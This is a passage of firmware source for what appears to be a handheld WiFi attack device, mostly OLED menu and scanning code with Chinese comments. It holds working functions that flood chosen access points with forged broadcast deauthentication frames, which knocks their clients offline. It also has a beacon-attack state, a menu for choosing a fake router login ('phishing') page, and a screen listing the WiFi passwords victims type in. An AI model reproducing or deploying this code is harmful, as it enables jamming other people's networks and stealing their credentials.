      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      
      // 检查并更新指示器状态
      unsigned long currentTime = millis();
      
      // 检查管理帧指示器是否应该隐藏（基于时间）
      if (g_showMgmtFrameIndicator && (currentTime - g_mgmtFrameIndicatorStartTime >= MGMT_FRAME_INDICATOR_TIME)) {
        g_showMgmtFrameIndicator = false;
      }
      
      // 绘制方向键指示器（顶部左侧）
      if (g_showDownIndicator) {
        u8g2_for_adafruit_gfx.setCursor(2, 10);
        u8g2_for_adafruit_gfx.print("[↓]");
      } else if (g_showUpIndicator) {
        u8g2_for_adafruit_gfx.setCursor(2, 10);
        u8g2_for_adafruit_gfx.print("[↑]");
      }
      
      // 绘制管理帧指示器（顶部右侧）
      if (g_showMgmtFrameIndicator) {
        u8g2_for_adafruit_gfx.setCursor(110, 10);
        u8g2_for_adafruit_gfx.print("[*]");
      }
      
      // 顶部显示当前监测信道和频段（小字体）
      int displayChannel = g_channelPreviewMode ? g_previewChannel : g_packetDetectChannel;
      String channelInfo = String("CH: ") + String(displayChannel);
      if (g_channelPreviewMode) {
        channelInfo += "*";
      }
      channelInfo += " " + getChannelBand(displayChannel);
      // 使用默认字体以支持中文
      int w1 = u8g2_for_adafruit_gfx.getUTF8Width(channelInfo.c_str());
      int x1 = (display.width() - w1) / 2;
      if (x1 < 0) x1 = 0;
      u8g2_for_adafruit_gfx.setCursor(x1, 10);
      u8g2_for_adafruit_gfx.print(channelInfo);
      
      // 绘制统计图表（增加高度以填补删除packets统计后的空间）
      drawPacketChart();
      
      display.display();
    }
    
    // 按键处理
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      if (showConfirmModal("停止数据包监视")) {
        stopPacketDetection();
        break;
      }
    }
    
    // 使用新的按键状态检测函数
    updateKeyStates();
    
    delay(10);
  }
  
  stopPacketDetection();
}

// AP模式网页选择（可扩展）
enum APWebPageKind {
  AP_WEB_TEST = 0,          // 简易认证页（web_test_page.h）
  AP_WEB_ROUTER_AUTH = 1    // 仿路由器认证页（web_router_auth_page.h）
};
int g_apSelectedPage = (int)AP_WEB_ROUTER_AUTH;

bool apWebPageSelectionMenu();

// AP页面选择菜单数据与绘制（参考攻击/首页样式）
static const char* g_apMenuItems[] = {"1.简约现代化", "2.老式路由器"};
static const int AP_MENU_ITEM_COUNT = sizeof(g_apMenuItems) / sizeof(g_apMenuItems[0]);
static int g_apBaseStartIndex = 0; // 供动画基底使用
static int g_apSkipRelIndex = -1;   // 在基础绘制中跳过的相对行（用于避免选中项重复绘制）

// 无刷新基础绘制：AP页面选择菜单
static void drawApMenuBase_NoFlush() {
  display.clearDisplay();
  display.setTextSize(1);
  // 标题：参考频段选择页面样式
  const char* title = "[选择钓鱼页面样式]";
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  {
    int w = u8g2_for_adafruit_gfx.getUTF8Width(title);
    int x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 12);
    u8g2_for_adafruit_gfx.print(title);
  }
  const int BASE_Y = 20; // 与频段选择相同的起始Y
  for (int i = 0; i < AP_MENU_ITEM_COUNT; i++) {
    int menuIndex = i;
    int rectY = BASE_Y + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 12; // 普通项基线
    if (i != g_apSkipRelIndex) {
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      u8g2_for_adafruit_gfx.setCursor(6, textY);
      u8g2_for_adafruit_gfx.print(g_apMenuItems[menuIndex]);
    }
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
}
// Web UI攻击状态变量
bool deauthAttackRunning = false;
bool beaconAttackRunning = false;

// LED控制变量
unsigned long lastRedLEDBlink = 0;
const unsigned long RED_LED_BLINK_INTERVAL = 500; // 红灯闪烁间隔（毫秒）
bool redLEDState = false;

// Structure to store target information
struct TargetInfo {
    uint8_t bssid[6];
    int channel;
    bool active;
};

std::vector<TargetInfo> smartTargets;
unsigned long lastScanTime = 0;
const unsigned long SCAN_INTERVAL = 600000; // 10分钟 in milliseconds
// WiFi 扫描完成标志（用于避免固定5秒等待）
volatile bool g_scanDone = false;

// ===== Deauth helpers & constants =====
// 复用的信道分组缓存，避免在循环中频繁创建 std::map
struct ChannelBuckets {
  std::vector<std::vector<const uint8_t *>> buckets;
  struct ExtraBucket {
    int channel;
    std::vector<const uint8_t *> bssids;
  };
  std::vector<ExtraBucket> extras;
  ChannelBuckets() {
    buckets.resize(sizeof(allChannels) / sizeof(allChannels[0]));
  }
  void clearBuckets() {
    for (auto &b : buckets) b.clear();
    for (auto &e : extras) e.bssids.clear();
  }
  int indexForChannel(int ch) const {
    for (size_t i = 0; i < sizeof(allChannels) / sizeof(allChannels[0]); i++) {
      if (allChannels[i] == ch) return (int)i;
    }
    return -1;
  }
  void add(int ch, const uint8_t *bssid) {
    int idx = indexForChannel(ch);
    if (idx >= 0) {
      buckets[(size_t)idx].push_back(bssid);
    } else {
      // 查找或创建额外信道桶
      for (auto &eb : extras) {
        if (eb.channel == ch) {
          eb.bssids.push_back(bssid);
          return;
        }
      }
      ExtraBucket nb;
      nb.channel = ch;
      nb.bssids.push_back(bssid);
      extras.push_back(std::move(nb));
    }
  }
};
static ChannelBuckets channelBucketsCache;
// 广播MAC常量，替代反复的"\xFF..."字面量
const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
// 默认发送的解除认证原因码序列（与现有逻辑保持一致）
const uint16_t DEAUTH_REASONS[3] = {1, 4, 16};

// 向指定BSSID连续发送一组解除认证帧（按DEAUTH_REASONS顺序），重复burstTimes次
// packetCount用于外部统计计数；interFrameDelayMs用于控制帧间延时，减轻CPU负载与拥塞
inline __attribute__((always_inline)) void sendDeauthBurstToBssid(const uint8_t* bssid,
                                   int burstTimes,
                                   int &packetCount,
                                   int interFrameDelayMs) {
  DeauthFrame frame;
  // 只需一次memcpy即可
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  size_t reasonCount = sizeof(DEAUTH_REASONS) / sizeof(DEAUTH_REASONS[0]);
  if (interFrameDelayMs > 0) {
    for (int burst = 0; burst < burstTimes; burst++) {
      for (size_t r = 0; r < reasonCount; r++) {
        frame.reason = DEAUTH_REASONS[r];
        wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
        packetCount++;
        delay(interFrameDelayMs);
      }
    }
  } else {
    // 无需delay时，去除分支判断，提高效率
    for (int burst = 0; burst < burstTimes; burst++) {
      for (size_t r = 0; r < reasonCount; r++) {
        frame.reason = DEAUTH_REASONS[r];
        wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
        packetCount++;
      }
    }
  }
}

// 根据指定原因码快速连续发送指定数量的解除认证帧
inline __attribute__((always_inline)) void sendFixedReasonDeauthBurst(const uint8_t* bssid,
                                       uint16_t reason,
                                       int framesToSend,
                                       int &packetCount,
                                       int interFrameDelayMs) {
  DeauthFrame frame;
  // 只需一次memcpy即可
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  frame.reason = reason;
  if (interFrameDelayMs > 0) {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
      delay(interFrameDelayMs);
    }
  } else {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// 根据指定原因码快速连续发送指定数量的解除认证帧（微秒级帧间隔）
inline __attribute__((always_inline)) void sendFixedReasonDeauthBurstUs(const uint8_t* bssid,
                                        uint16_t reason,
                                        int framesToSend,
                                        int &packetCount,
                                        unsigned int interFrameDelayUs) {
  DeauthFrame frame;
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  frame.reason = reason;
  if (interFrameDelayUs > 0) {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
      delayMicroseconds(interFrameDelayUs);
    }
  } else {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// 向指定BSSID按标准原因码序列（DEAUTH_REASONS）进行burst发送（微秒级帧间隔）
inline __attribute__((always_inline)) void sendDeauthBurstToBssidUs(const uint8_t* bssid,
                                     int burstTimes,
                                     int &packetCount,
                                     unsigned int interFrameDelayUs) {
  DeauthFrame frame;
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  size_t reasonCount = sizeof(DEAUTH_REASONS) / sizeof(DEAUTH_REASONS[0]);
  for (int burst = 0; burst < burstTimes; burst++) {
    for (size_t r = 0; r < reasonCount; r++) {
      frame.reason = DEAUTH_REASONS[r];
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
      if (interFrameDelayUs > 0) delayMicroseconds(interFrameDelayUs);
    }
  }
}
// timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    result.security_type = record->security;  // 添加这行记录加密类型
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    // 去重：如果同一BSSID已存在，则仅更新更强RSSI并跳过插入
    bool isDuplicate = false;
    for (size_t i = 0; i < scan_results.size(); i++) {
      bool same = true;
      for (int k = 0; k < 6; k++) {
        if (scan_results[i].bssid[k] != result.bssid[k]) { same = false; break; }
      }
      if (same) {
        // 可选：若SSID为空而新结果有名称，或RSSI更强，则更新
        if (scan_results[i].ssid.length() == 0 && result.ssid.length() > 0) {
          scan_results[i].ssid = result.ssid;
        }
        if (result.rssi > scan_results[i].rssi) {
          scan_results[i].rssi = result.rssi;
          scan_results[i].channel = result.channel;
          scan_results[i].security_type = result.security_type;
          memcpy(&scan_results[i].bssid, &result.bssid, 6);
          scan_results[i].bssid_str = result.bssid_str;
        }
        isDuplicate = true;
        break;
      }
    }
    if (!isDuplicate) {
      scan_results.push_back(result);
    }
  } else {
    // 扫描完成
    g_scanDone = true;
  }
  return RTW_SUCCESS;
}
// 移除未使用的 selectedmenu()

// 应急WiFi状态检测和恢复
static bool emergencyWiFiRecovery() {
  static unsigned long lastRecoveryAttempt = 0;
  unsigned long now = millis();
  
  // 防止频繁恢复尝试
  if (now - lastRecoveryAttempt < 30000) { // 30秒内最多一次
    return false;
  }
  
  Serial.println("=== 检测到WiFi异常，执行应急恢复 ===");
  lastRecoveryAttempt = now;
  
  // 1. 强制清理所有状态
  scan_results.clear();
  scan_results.shrink_to_fit();
  SelectedVector.clear();
  SelectedVector.shrink_to_fit();
  g_scanDone = false;
  
  // 2. 强制重置WiFi硬件
  Serial.println("强制重置WiFi硬件...");
  wifi_off();
  delay(1000); // 更长的重置时间
  wifi_on(RTW_MODE_AP);
  delay(1000);
  
  // 3. 重新启动AP
  String channelStr = String(current_channel);
  if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
    Serial.println("应急恢复: AP重启成功");
    return true;
  } else {
    Serial.println("应急恢复: AP重启失败");
    return false;
  }
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks...");
  
  scan_results.clear();
  scan_results.reserve(64); // 预分配内存，避免频繁重新分配
  SelectedVector.clear(); // 清空选中的WiFi列表
  g_scanDone = false;
  unsigned long startMs = millis();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    const unsigned long SCAN_TIMEOUT_MS = 2500; // 最长等待2.5秒
    while (!g_scanDone && (millis() - startMs) < SCAN_TIMEOUT_MS) {
      delay(10);
    }
    DEBUG_SER_PRINT(" Done!\n");
    // 重置选择标记，与新的扫描结果对齐
    selectedFlags.assign(scan_results.size(), 0);
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    // 扫描失败时尝试应急恢复
    if (scan_results.empty()) {
      Serial.println("扫描失败且无结果，尝试应急恢复...");
      emergencyWiFiRecovery();
    }
    return 1;
  }
}

// 复用的扫描流程与UI显示：标题居中+动态显示最新SSID
static void performScanWithUI(const char* title, unsigned long timeoutMs, int maxResults) {
  while (true) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);

    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    int titleW = u8g2_for_adafruit_gfx.getUTF8Width(title);
    int titleX = (display.width() - titleW) / 2;
    u8g2_for_adafruit_gfx.setCursor(titleX, 24);
    u8g2_for_adafruit_gfx.print(title);
    display.display();

    scan_results.clear();
    SelectedVector.clear();
    g_scanDone = false;
    unsigned long startMs = millis();
    // 扫描等待动画：在中部显示"_-_-_-_-_"与"-_-_-_-_-"交替动画
    const char* frames[2] = {"_-_-_-_-_", "-_-_-_-_-"};
    int frameIndex = 0;
    const unsigned long animIntervalMs = 200;
    unsigned long lastAnimMs = 0;
    if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
      while (!g_scanDone && (millis() - startMs) < timeoutMs) {
        unsigned long nowMs = millis();
        if (nowMs - lastAnimMs >= animIntervalMs) {
          lastAnimMs = nowMs;
          display.clearDisplay();
          u8g2_for_adafruit_gfx.setFontMode(1);
          u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
          int tW = u8g2_for_adafruit_gfx.getUTF8Width(title);
          int tX = (display.width() - tW) / 2;
          u8g2_for_adafruit_gfx.setCursor(tX, 24);
          u8g2_for_adafruit_gfx.print(title);
          const char* animText = frames[frameIndex & 1];
          int aW = u8g2_for_adafruit_gfx.getUTF8Width(animText);
          int aX = (display.width() - aW) / 2;
          if (aX < 0) aX = 0;
          u8g2_for_adafruit_gfx.setCursor(aX, 48);
          u8g2_for_adafruit_gfx.print(animText);
          display.display();
          frameIndex++;
        }
        delay(10);
      }
      if (maxResults > 0 && scan_results.size() > (size_t)maxResults) {
        scan_results.resize(maxResults);
      }
      selectedFlags.assign(scan_results.size(), 0);
    } else {
      Serial.println("扫描启动失败，进入等待状态");
      while (true) delay(1000);
    }

    Serial.println("扫描完成");
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 25);
    u8g2_for_adafruit_gfx.print("完成");
    display.display();
    delay(300);
    menustate = 0;
    homeState = 0;
    homeStartIndex = 0;
    // g_homeBaseStartIndex 将在首页绘制时同步，无需在此重置
    break;
  }
}

// 移除未使用的 contains()/addValue()
//uint8_t becaon_bssid[6];
inline bool isIndexSelected(int index) {
  return index >= 0 && (size_t)index < selectedFlags.size() && selectedFlags[(size_t)index] != 0;
}

void toggleSelection(int index) {
  bool found = false;
  int foundIndex = -1;
  
  // 查找是否已经选中
  for(size_t i = 0; i < SelectedVector.size(); i++) {
    if(SelectedVector[i] == index) {
      found = true;
      foundIndex = i;
      break;
    }
  }
  
  // 切换选中状态
  if(found) {
    // 删除选中项
    SelectedVector.erase(SelectedVector.begin() + foundIndex);
    if ((size_t)index < selectedFlags.size()) selectedFlags[(size_t)index] = 0;
  } else {
    // 添加新选中项
    SelectedVector.push_back(index);
    if (selectedFlags.size() != scan_results.size()) selectedFlags.assign(scan_results.size(), 0);
    if ((size_t)index < selectedFlags.size()) selectedFlags[(size_t)index] = 1;
  }
}

// 检测字符串是否包含中文字符
bool containsChinese(const String& str) {
  for (size_t i = 0; i < (size_t)str.length(); i++) {
    if ((unsigned char)str[i] > 0x7F) {
      return true;
    }
  }
  return false;
}

String utf8TruncateToWidth(const String& input, int maxPixelWidth) {
  String out = input;
  if (u8g2_for_adafruit_gfx.getUTF8Width(out.c_str()) <= maxPixelWidth) return out;
  int ellipsisWidth = u8g2_for_adafruit_gfx.getUTF8Width("...");
  // Trim until text + ellipsis fits
  while (out.length() > 0 && (u8g2_for_adafruit_gfx.getUTF8Width(out.c_str()) + ellipsisWidth) > maxPixelWidth) {
    out.remove(out.length() - 1);
    // ensure we don't cut in the middle of a UTF-8 multibyte char
    while (out.length() > 0) {
      uint8_t last = (uint8_t)out[out.length() - 1];
      if ((last & 0xC0) == 0x80) {
        out.remove(out.length() - 1);
      } else {
        break;
      }
    }
  }
  if (out.length() == 0) return String("...");
  return out + "...";
}

// 裁剪到指定像素宽度且不添加省略号（用于高亮项滚动显示）
String utf8ClipToWidthNoEllipsis(const String& input, int maxPixelWidth) {
  if (u8g2_for_adafruit_gfx.getUTF8Width(input.c_str()) <= maxPixelWidth) return input;
  String out = input;
  while (out.length() > 0 && u8g2_for_adafruit_gfx.getUTF8Width(out.c_str()) > maxPixelWidth) {
    out.remove(out.length() - 1);
    while (out.length() > 0) {
      uint8_t last = (uint8_t)out[out.length() - 1];
      if ((last & 0xC0) == 0x80) {
        out.remove(out.length() - 1);
      } else {
        break;
      }
    }
  }
  return out;
}

// 前进到下一个 UTF-8 字符起始边界（跳过续字节），返回新的字节索引
static inline int advanceUtf8Index(const String& s, int start) {
  int i = start + 1;
  int n = s.length();
  while (i < n) {
    uint8_t b = (uint8_t)s[i];
    if ((b & 0xC0) != 0x80) break; // 不是续字节，说明来到下一个字符起始
    i++;
  }
  return (i <= n) ? i : n;
}

// ===== UI Helpers: rounded highlight, chevron =====
void drawRightChevron(int y, int lineHeight, bool isSelected) {
  int x = display.width() - UI_RIGHT_GUTTER - 8; // 向左移动箭头
  int ymid = y + lineHeight / 2;
  int color = isSelected ? SSD1306_BLACK : SSD1306_WHITE;
  display.fillTriangle(x, ymid - 3, x, ymid + 3, x + 4, ymid, color);
}

void drawRoundedHighlight(int y, int height) {
  int width = display.width() - UI_RIGHT_GUTTER; // 预留右侧滚动条区域
  int radius = 2; // 稍微减小圆角
  display.fillRoundRect(0, y, width, height, radius, SSD1306_WHITE);
}

// ===== OLED single-line helpers =====
// 清理一行区域并居中绘制文本，然后立即刷新显示
static inline void oledDrawCenteredLine(const char* text, int baselineY) {
  display.fillRect(0, baselineY - 9, display.width(), 12, SSD1306_BLACK);
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  int w = u8g2_for_adafruit_gfx.getUTF8Width(text);
  int x = (display.width() - w) / 2;
  if (x < 0) x = 0;
  u8g2_for_adafruit_gfx.setCursor(x, baselineY);
  u8g2_for_adafruit_gfx.print(text);
  display.display();
}

// 在节流间隔内尝试绘制；若到达间隔则绘制并返回true
static inline bool oledMaybeDrawCenteredLine(const char* text, int baselineY, unsigned long& lastDrawMs, unsigned long intervalMs) {
  unsigned long nowMs = millis();
  if (intervalMs == 0) return false; // 0 表示不刷新
  if (nowMs - lastDrawMs < intervalMs) return false;
  oledDrawCenteredLine(text, baselineY);
  lastDrawMs = nowMs;
  return true;
}

// 首页滚动条
void drawHomeScrollbar(int startIndex) {
  // 如果一页即可显示全部，不绘制滚动条
  if (HOME_MAX_ITEMS <= HOME_PAGE_SIZE) return;

  int barX = display.width() - UI_RIGHT_GUTTER + 1; // 靠近右侧边缘内侧
  int barWidth = UI_RIGHT_GUTTER - 2; // 留出1px内边距
  int trackY = HOME_Y_OFFSET;
  int trackH = HOME_ITEM_HEIGHT * HOME_PAGE_SIZE;

  // 轨道（浅色描边）
  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);

  // 滑块高度按页占比
  float pageRatio = (float)HOME_PAGE_SIZE / (float)HOME_MAX_ITEMS;
  int computedThumb = (int)(trackH * pageRatio);
  int thumbH = (computedThumb < 6) ? 6 : computedThumb;
  // 滑块位置按起始索引比例
  float posRatio = (float)startIndex / (float)(HOME_MAX_ITEMS - HOME_PAGE_SIZE);
  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);

  // 滑块
  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
}

// 动画版滚动条：支持浮点起始索引以实现平滑过渡
void drawHomeScrollbarFraction(float startIndexF) {
  if (HOME_MAX_ITEMS <= HOME_PAGE_SIZE) return;

  int barX = display.width() - UI_RIGHT_GUTTER + 1;
  int barWidth = UI_RIGHT_GUTTER - 2;
  int trackY = HOME_Y_OFFSET;
  int trackH = HOME_ITEM_HEIGHT * HOME_PAGE_SIZE;

  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);

  float pageRatio = (float)HOME_PAGE_SIZE / (float)HOME_MAX_ITEMS;
  int computedThumb = (int)(trackH * pageRatio);
  int thumbH = (computedThumb < 6) ? 6 : computedThumb;

  float denom = (float)(HOME_MAX_ITEMS - HOME_PAGE_SIZE);
  float posRatio = denom > 0.0f ? (startIndexF / denom) : 0.0f;
  if (posRatio < 0.0f) posRatio = 0.0f;
  if (posRatio > 1.0f) posRatio = 1.0f;
  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);

  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
}

// 滚动条已移除

// ===== 动画与基础绘制辅助 =====
// 基础绘制：主页（不带高亮） - 已废弃，使用 drawHomeMenuBasePaged 代替
// void drawHomeMenuBase() {
//   // 此函数已被 drawHomeMenuBasePaged 和 drawHomeMenuBasePaged_NoFlush 替代
// }

// ===== WebTest OLED Pages (defined after globals to fix forward references) =====
void drawWebTestMain() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 第一行
  const char* line1_text = "↑ 接入点信息 ↑";
  int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1_text);
  int x1_center = (display.width() - w1) / 2;
  u8g2_for_adafruit_gfx.setCursor(x1_center, 12);
  u8g2_for_adafruit_gfx.print(line1_text);
  
  
  // 第二行
  u8g2_for_adafruit_gfx.setCursor(15, 28);
  u8g2_for_adafruit_gfx.print("停止钓鱼并返回");
  int left_arrow2_x = 5;
  int arrow2_y = 22;
  // 绘制向左箭头
  display.fillTriangle(left_arrow2_x + 4, arrow2_y - 3, left_arrow2_x + 4, arrow2_y + 3, left_arrow2_x - 2, arrow2_y, SSD1306_WHITE);
  
  // 第三行
  const char* line3_text = "查看接收到的密码";
  int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3_text);
  int x3_right = display.width() - w3 - 15;
  u8g2_for_adafruit_gfx.setCursor(x3_right, 44);
  u8g2_for_adafruit_gfx.print(line3_text);
  int right_arrow3_x = display.width() - 5;
  int arrow3_y = 38;
  // 绘制向右箭头
  display.fillTriangle(right_arrow3_x - 4, arrow3_y - 3, right_arrow3_x - 4, arrow3_y + 3, right_arrow3_x + 2, arrow3_y, SSD1306_WHITE);
  // 绘制"查看接收到的密码"圆角边框：
  // 规则：
  // - 收到过至少一次密码后常亮
  // - 每次后续收到密码，边框闪烁两下（4次可见性翻转）
  {
    bool should_draw_border = false;
    if (webtest_border_always_on) {
      should_draw_border = true;
    }
    if (webtest_flash_remaining_toggles > 0) {
      unsigned long now_ms = millis();
      // 每150ms切换一次可见性
      if (now_ms - webtest_last_flash_toggle_ms >= 150UL) {
        webtest_last_flash_toggle_ms = now_ms;
        webtest_border_flash_visible = !webtest_border_flash_visible;
        webtest_flash_remaining_toggles--;
      }
      // 闪烁阶段以当前可见性为准（可覆盖常亮，实现闪烁效果）
      should_draw_border = webtest_border_flash_visible;
    }
    if (should_draw_border) {
      int text_y_baseline = 44;
      int text_height = 10; // 估算高度
      int pad_x = 2;
      int pad_y = 2;
      int rect_x = x3_right - pad_x - 1;
      int rect_y = text_y_baseline - text_height - pad_y;
      int rect_w = w3 + pad_x * 2 + 2;
      int rect_h = text_height + pad_y * 2;
      int r = 3; // 圆角半径
      display.drawRoundRect(rect_x, rect_y, rect_w, rect_h, r, SSD1306_WHITE);
    }
  }
  
  // 第四行
  const char* line4_text = "↓ 运行状态 ↓";
  int w4 = u8g2_for_adafruit_gfx.getUTF8Width(line4_text);
  int x4_center = (display.width() - w4) / 2;
  u8g2_for_adafruit_gfx.setCursor(x4_center, 60);
  u8g2_for_adafruit_gfx.print(line4_text);
  
  display.display();
}

void drawWebTestInfo() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  const char* title = "[接入点信息]";
  int w = u8g2_for_adafruit_gfx.getUTF8Width(title);
  int x = (display.width() - w) / 2;
  u8g2_for_adafruit_gfx.setCursor(x, 12);
  u8g2_for_adafruit_gfx.print(title);
  String line2 = web_test_ssid_dynamic;
  w = u8g2_for_adafruit_gfx.getUTF8Width(line2.c_str());
  x = (display.width() - w) / 2;
  u8g2_for_adafruit_gfx.setCursor(x, 28);
  u8g2_for_adafruit_gfx.print(line2);
  String band = (is24GChannel(web_test_channel_dynamic) ? "2.4" : (is5GChannel(web_test_channel_dynamic) ? "5G" : "?"));
  String line3 = String("频段: ") + band + String("|信道: ") + String(web_test_channel_dynamic);
  w = u8g2_for_adafruit_gfx.getUTF8Width(line3.c_str());
  x = (display.width() - w) / 2;
  u8g2_for_adafruit_gfx.setCursor(x, 44);
  u8g2_for_adafruit_gfx.print(line3);
  const char* hint = "↓ 返回 ↓";
  w = u8g2_for_adafruit_gfx.getUTF8Width(hint);
  x = (display.width() - w) / 2;
  u8g2_for_adafruit_gfx.setCursor(x, 60);
  u8g2_for_adafruit_gfx.print(hint);
  display.display();
}

void drawWebTestPasswords() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 12);
  u8g2_for_adafruit_gfx.print("< 返回");
  const char* title = "[密码列表]";
  int w = u8g2_for_adafruit_gfx.getUTF8Width(title);
  int x = display.width() - w - 2;
  u8g2_for_adafruit_gfx.setCursor(x, 12);
  u8g2_for_adafruit_gfx.print(title);
  const int startY = 28;
  const int lineH = 14;
  const int scrollbarWidth = 3; // 极窄滚动条宽度
  int y = startY;
  if (web_test_submitted_texts.empty()) {
    const char* emptyMsg = "暂未接收到密码提交";
    w = u8g2_for_adafruit_gfx.getUTF8Width(emptyMsg);
    x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 40);
    u8g2_for_adafruit_gfx.print(emptyMsg);
  } else {
    int totalItems = (int)web_test_submitted_texts.size();
    if (webtest_password_scroll < 0) webtest_password_scroll = 0;
    if (webtest_password_scroll > totalItems - 1) webtest_password_scroll = totalItems > 0 ? totalItems - 1 : 0;
    int usedLines = 0;
    for (int i = webtest_password_scroll; i < (int)web_test_submitted_texts.size() && usedLines < 3; i++) {
      String txt = web_test_submitted_texts[i];
      String remaining = txt;
      bool firstLineOfEntry = true;
      while (remaining.length() > 0 && usedLines < 3) {
        int widthAvail = display.width() - 6 - (scrollbarWidth + 1); // 预留滚动条并留1像素间距
        int tw = u8g2_for_adafruit_gfx.getUTF8Width(remaining.c_str());
        String seg = remaining;
        if (tw > widthAvail) {
          int approx = (remaining.length() * widthAvail) / tw;
          if (approx <= 0) approx = 1;
          seg = remaining.substring(0, approx);
          remaining = remaining.substring(approx);
        } else {
          remaining = "";
        }
        // 构造显示行：每条记录第一行前缀 "> "，后续换行不加前缀
        String line = seg;
        if (firstLineOfEntry) {
          line = String("> ") + line;
          firstLineOfEntry = false;
        }
        u8g2_for_adafruit_gfx.setCursor(2, y);
        u8g2_for_adafruit_gfx.print(line);
        y += lineH;
        usedLines++;
      }
    }
    // 绘制简约滚动条（覆盖三行可视区域）
    // totalItems 已在上方计算
    if (totalItems > 1) {
      int trackX = display.width() - scrollbarWidth;
      int trackY = startY; // 与首行对齐
      int trackH = 3 * lineH; // 覆盖三行
      // 若超出屏幕高度则裁剪
      if (trackY + trackH > display.height()) {
        trackH = display.height() - trackY;
      }
      if (trackH < 6) trackH = 6; // 最小高度
      // 细轨道（终点为包含式坐标）
      display.drawLine(trackX, trackY, trackX, trackY + trackH - 1, SSD1306_WHITE);
      // 拇指高度最小6px，按可见比例估算
      int thumbH = (trackH * 1) / std::max(totalItems, 3); // 视窗大约覆盖1项
